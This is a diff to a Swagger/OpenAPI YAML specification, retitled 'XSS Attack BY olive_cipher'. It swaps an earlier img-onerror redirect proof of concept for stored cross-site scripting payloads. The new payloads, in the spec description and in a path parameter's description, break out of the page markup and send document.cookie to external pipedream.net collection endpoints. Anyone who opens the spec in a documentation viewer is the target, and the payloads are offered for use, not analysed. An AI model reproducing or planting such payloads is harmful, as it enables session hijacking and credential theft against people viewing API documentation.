@@ -1,26 +1,38 @@
 swagger: '2.0'
 info:
-  title: Redirect PoC
+  title: XSS Attack BY olive_cipher
   description: |
-    <img src=x onerror="window.location='https://evil.com'">
-  version: 1.0.0
-basePath: /
+    <path id="</textarea><https://eoakg9agm15930.m.pipedream.net?cookie=' + document.cookie>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /redirect:
+  /olive_cipher:
     get:
-      summary: Normal endpoint for testing
       responses:
         '200':
-          description: OK
-  /redirect/{id}:
+          description: No response was specified
+      tags:
+        - olive_cipher_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
     delete:
-      summary: Silent redirect on delete
       parameters:
-        - name: id
+        - description: |
+            <path id="</textarea><https://eo76o4hz61zthar.m.pipedream.net/root/5a59d5e46483/?cookie=' + document.cookie>"></form>
+          format: int64
           in: path
+          name: id
           required: true
-          type: string
-          description: "<img src=x onerror='window.location=`https://evil.com`'>"
+          type: integer
       responses:
         '200':
-          description: OK
+          description: No response was specified
